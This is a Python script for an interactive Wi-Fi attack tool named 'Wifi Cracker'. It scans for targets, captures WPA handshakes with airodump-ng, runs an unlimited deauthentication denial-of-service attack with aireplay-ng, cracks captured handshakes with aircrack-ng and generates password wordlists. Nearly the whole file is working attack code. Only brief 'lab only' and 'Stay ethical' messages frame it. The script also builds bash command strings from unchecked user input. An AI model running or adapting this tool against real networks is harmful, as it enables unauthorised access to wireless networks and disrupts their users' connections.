import subprocess
import os
import time
import sys
from GenCharlist import generate_password
from termcolor import colored
from mac_address_detector import find_mac_and_state
from network_scanner import scan_network
from colorama import Fore, Style, init as colorama_init
import getpass
from animation import Animation

colorama_init(autoreset=True)


class Attack:
    def __init__(self, mac='', essid='', iface='wlan0', capture_file='', wordlist='', iface_mon='', channel='', band='', ip_range=None):
        self.mac = mac
        self.essid = essid
        self.iface = iface
        self.capture_file = capture_file
        self.wordlist = wordlist
        self.iface_mon = iface_mon
        self.channel = channel
        self.band = band
        self.ip_range = ip_range
    

    def list_targets(self, max_retries=20):
        """Scan network for targets, optionally search by MAC or select one."""
        if not self.ip_range:
            pass
            self.ip_range = input(Fore.CYAN + "Enter IP range (e.g., 192.168.1.0/24): ").strip()
            if not self.ip_range:
                print(Fore.RED + "[!] No IP range entered. Cannot continue.")
                return None

        retries = 0
        retry_delay = 5

        while retries < max_retries:
            print(Fore.BLUE + f"Scanning network: {self.ip_range} ...")
            scan_output = scan_network(self.ip_range)
            mac_data = find_mac_and_state(scan_output)

            if not mac_data:
                print(Fore.RED + f"[!] No hosts detected. Retrying in {retry_delay} seconds...")
                try:
                     self.kill_conflicting_processes()
                     self.restart_nm()
                except Exception as e:
                    print(Fore.RED + f"[!] Failed to restart NetworkManager: {e}")
                    return None
                time.sleep(retry_delay)
                retries += 1
                continue

            if self.essid:
                normalized = self.essid.lower()
                found = False

                for ip, (mac, state, dev_type) in mac_data.items():
                    if mac.lower() == normalized:
                        color_state = colored(state, 'green' if 'up' in state.lower() else 'red')
                        print(f"{ip:<20}{mac:<20}{color_state:<20}{dev_type}")
                        found = True

                if not found:
                    print(Fore.YELLOW + f"[!] MAC {self.essid} not found. Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                    retries += 1
                    continue

                return mac_data

            print(f"{'Index':<6}{'IP Address':<20}{'MAC Address':<20}{'State':<20}{'Device Type'}")
            print("-" * 90)

            indexed_list = list(mac_data.items())
            for idx, (ip, (mac, state, dev_type)) in enumerate(indexed_list):
                color_state = colored(state, 'green' if 'up' in state.lower() else 'red')
                print(f"{idx:<6}{ip:<20}{mac:<20}{color_state:<20}{dev_type}")

            # Ask user to select
            while True:
                try:
                    choice = input(Fore.CYAN + "\n Select a target (Essid) by index: ").strip()
                    if not choice.isdigit():
                        print(Fore.RED + "[!] Enter a valid number.")
                        continue
                    choice = int(choice)
                    if 0 <= choice < len(indexed_list):
                        ip, data = indexed_list[choice]
                        print(Fore.GREEN + f"\n✔ Selected: {ip}  →  {data[0]}")
                        self.essid = data[0]
                        self.mac = data[1][0]
                        return {ip: data}
                    else:
                        print(Fore.RED + "[!] Index out of range.")
                except KeyboardInterrupt:
                    print(Fore.RED + "\n[!] Selection cancelled.")
                    return None

        print(Fore.RED + "[!] Max retries reached. No targets found.")
        return None

    def get_essid(self):
        """Return the currently selected ESSID (after list_targets)."""
        return self.essid
    


    def kill_conflicting_processes(self):
        print("[*] Killing interfering processes...")
        subprocess.run(["airmon-ng", "check", "kill"])
        subprocess.run(["airmon-ng", "stop", self.iface_mon])

    def find_channel(self):
        self.kill_conflicting_processes()
        command = f"airmon-ng start {self.iface}; airodump-ng {self.iface_mon} -d {self.mac} --band {self.band}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def cap_handshake(self):
        command = f"airodump-ng {self.iface_mon} -d {self.mac} -c {self.channel} -w {self.capture_file}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def dos(self):
        self.essid  = self.get_essid()
        command = f"aireplay-ng --deauth 0 -a {self.mac} {self.iface_mon} -c {self.essid}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def crack(self):
        if not self.wordlist:
            print("[!] Error: Please specify a dictionary file (-w).")
            return
        if not self.mac:
            print("[!] Error: MAC address (-b) is missing.")
            return

        cap_files = [f for f in os.listdir() if f.startswith(self.capture_file) and f.endswith(".cap")]
        if not cap_files:
            print(f"[!] Error: No .cap capture files found for base '{self.capture_file}'.")
            return
        
        cap_files.sort()
        cap_file = cap_files[-1]
        print(f"[+] Using capture file: {cap_file}")

        command = f"aircrack-ng -w {self.wordlist} -b {self.mac} {cap_file}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

        
    def generate_pass(self, monster, filepasswords):
        self.monster = monster
        self.filepasswords = filepasswords
        subprocess.run(['crunch', '10', '10', '-t', self.monster, '-o', self.filepasswords])
        
    def restart_nm(self):
        subprocess.run(['systemctl', 'restart', 'NetworkManager'])
        

    def find_info_about_ap(self):
        command_str = 'nmcli -f SSID,CHAN,BSSID dev wifi'
        subprocess.run(command_str,shell=True)
    def channeloriented(self):
        self.channel = input('choose the channel that you see:')
        command_str = f'airodump-ng {self.iface_mon} -d {self.mac} -c {self.channel}'
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])
    def wireshark_EAPOL(self):
        cap_files = [f for f in os.listdir() if f.startswith(self.capture_file) and f.endswith(".cap")]
        if not cap_files:
            print(Fore.RED + f"[!] No .cap files found for base '{self.capture_file}'. Cannot open Wireshark.")
            return

        cap_files.sort()
        cap_file = cap_files[-1] 
        print(Fore.GREEN + f"[+] Opening Wireshark for: {cap_file}")

        command_str = f'wireshark "{cap_file}" -Y "eapol"; echo "Press Enter to exit..."; read'
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])
        

    @staticmethod
    def menu():
        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Welcome to the Attack Menu ===" + Style.RESET_ALL)
        print(Fore.CYAN + " 00 " + Fore.WHITE + "- " + Fore.YELLOW + "Find info about AP (run this first)")
        print(Fore.CYAN + "  1 " + Fore.WHITE + "- " + Fore.YELLOW + "Find Channel (run this second)")
        print(Fore.CYAN + "  2 " + Fore.WHITE + "- " + Fore.YELLOW + "Capture Handshake")
        print(Fore.CYAN + "  3 " + Fore.WHITE + "- " + Fore.YELLOW + "Denial of Service (DoS)")
        print(Fore.CYAN + "  4 " + Fore.WHITE + "- " + Fore.YELLOW + "Crack Handshake")
        print(Fore.CYAN + "  5 " + Fore.WHITE + "- " + Fore.YELLOW + "Generate Password List")
        print(Fore.CYAN + "  6 " + Fore.WHITE + "- " + Fore.YELLOW + "Restart Network Manager (ensure this is up before executing 00)")
        print(Fore.CYAN + "001 " + Fore.WHITE + "- " + Fore.YELLOW + "See EAPOL in Wireshark")
        print(Fore.CYAN + "  0 " + Fore.WHITE + "- " + Fore.RED + Style.BRIGHT + "Exit" + Style.RESET_ALL)
        
        choice = input(Fore.GREEN + Style.BRIGHT + "\n Enter your choice: " + Style.RESET_ALL).strip()
        return choice


def main():
    try:
        iface = input(Fore.CYAN + "Enter your interface (e.g. wlan0): " + Style.RESET_ALL).strip()
        if not iface:
            iface = "wlan0"
            print(Fore.YELLOW + f"  No interface entered. Using default: {iface}")
        iface_mon = iface + 'mon'

        capture_file = input(Fore.CYAN + "Enter capture filename base (e.g hack0): " + Style.RESET_ALL).strip()
        if not capture_file:
            capture_file = "hack0"
            print(Fore.YELLOW + f"  No filename entered. Using default: {capture_file}")

        attack = Attack(mac="",essid='', iface=iface, capture_file=capture_file, wordlist="", iface_mon=iface_mon, channel="", band="",ip_range=None)
       
        while True:
            hosts = attack.list_targets()
            if hosts:
                print(Fore.GREEN + f"[+] Hosts found: {len(hosts)}")
                break
            else:
                print(Fore.RED + "No hosts found. Please try again.")

        mac = attack.get_essid()
        if not mac:
            mac = "00:00:00:00:00:00"
            print(Fore.YELLOW + f"  No MAC entered. Using placeholder: {mac}")

        choice = input(Fore.BLUE + "Do you have a wordlist? Type 'yes' or press Enter to auto-generate: " + Style.RESET_ALL).strip().lower()
        if choice == "yes":
            wordlist = input(Fore.CYAN + "Enter path to wordlist: " + Style.RESET_ALL).strip()
            if not wordlist or not os.path.exists(wordlist):
                print(Fore.RED + f"File '{wordlist}' not found. Generating a default wordlist.")
                choice = ""
        if choice != "yes":
            print(Fore.YELLOW + "  No wordlist provided. Generating one using your input...")
            base_word = getpass.getpass(Fore.CYAN + "Enter part of the password to add random specials: " + Style.RESET_ALL).strip()
            if not base_word:
                base_word = "password"
                print(Fore.YELLOW + f"  No input provided. Using default base word: {base_word}")
            wordlist = "generated_password.txt"
            generate_password(base_word, wordlist)
            print(Fore.GREEN + f"Password list generated: {wordlist}")

        attack.mac = mac
        attack.wordlist = wordlist

        channel = ''
        band = ''

        while True:
            choice = Attack.menu()

            if choice == "00":
                print(Fore.BLUE + "Scanning for access points...")
                attack.find_info_about_ap()
                attack.mac = input(Fore.CYAN + "Enter AP MAC address from step 00 or the router's BSSID: " + Style.RESET_ALL).strip()
                if not attack.mac:
                    print(Fore.YELLOW + "  No MAC entered. Skipping update.")

            elif choice == "1":
                band = input(Fore.CYAN + "Enter band (like 'a', 'ab', 'abg') or press Enter for default ('abg'): " + Style.RESET_ALL).strip()
                if not band:
                    band = 'abg'
                    print(Fore.YELLOW + f"  No band entered. Using default: {band}")
                attack.band = band
                print(Fore.YELLOW + "Press CTRL + C to stop channel scanning.")
                attack.find_channel()
                input(Fore.CYAN + "Press Enter to proceed..." + Style.RESET_ALL)
                attack.channeloriented()

            elif choice == "2":
                channel = input(Fore.CYAN + "Enter the channel number: " + Style.RESET_ALL).strip()
                if not channel:
                    print(Fore.YELLOW + "  No channel entered. Skipping handshake capture.")
                    continue
                attack.channel = channel
                attack.cap_handshake()

            elif choice == "3":
                attack.iface_mon = iface_mon
                print(Fore.RED + "  Launching deauthentication attack (simulation/lab only!)")
                attack.dos()

            elif choice == "4":
                cap_file_path = os.path.join("assets", f"{attack.capture_file}-01.cap")
                if os.path.exists(cap_file_path):
                    print(Fore.GREEN + f"Capture file found: {cap_file_path}")
                    attack.crack()
                else:
                    print(Fore.RED + f"Capture file '{cap_file_path}' not found. Cannot crack yet.")

            elif choice == "5":
                monster = input(Fore.CYAN + "Enter pattern for password generation (e.g., abc%%%%%%): " + Style.RESET_ALL).strip()
                if not monster:
                    monster = "abc%%%%%%"
                    print(Fore.YELLOW + f"  No pattern entered. Using default: {monster}")
                filepasswords = input(Fore.CYAN + "Enter output filename (saved in assets/): " + Style.RESET_ALL).strip()
                if not filepasswords:
                    filepasswords = "generated_passwords.txt"
                    print(Fore.YELLOW + f"No filename entered. Using default: {filepasswords}")
                BASE_DIR = os.path.dirname(os.path.abspath(__file__))
                ASSETS_DIR = os.path.join(BASE_DIR, "assets")
                os.makedirs(ASSETS_DIR, exist_ok=True)

                filepasswords_path = os.path.join(ASSETS_DIR, filepasswords)
                attack.generate_pass(monster, filepasswords_path)

                print(Fore.GREEN + f"Passwords generated and saved to {filepasswords_path}")

            elif choice == "001":
                print(Fore.BLUE + "Opening Wireshark to inspect EAPOL packets...")
                attack.wireshark_EAPOL()

            elif choice == "6":
                print(Fore.CYAN + "Restarting Network Manager...")
                attack.restart_nm()
                print(Fore.GREEN + "Network Manager restarted successfully.")

            elif choice == "0":
                print(Fore.MAGENTA + "Exiting... Stay ethical!")
                break

            else:
                print(Fore.RED + "Invalid choice, please try again.")

    except KeyboardInterrupt:
        print(Fore.MAGENTA + "\nExiting gracefully (CTRL+C pressed). Stay ethical!")
        sys.exit(0)

if __name__ == "__main__":
    Animation.animated_banner("Wifi Cracker","By cyb2rS2c", frames=8, delay=0.07)
    main()
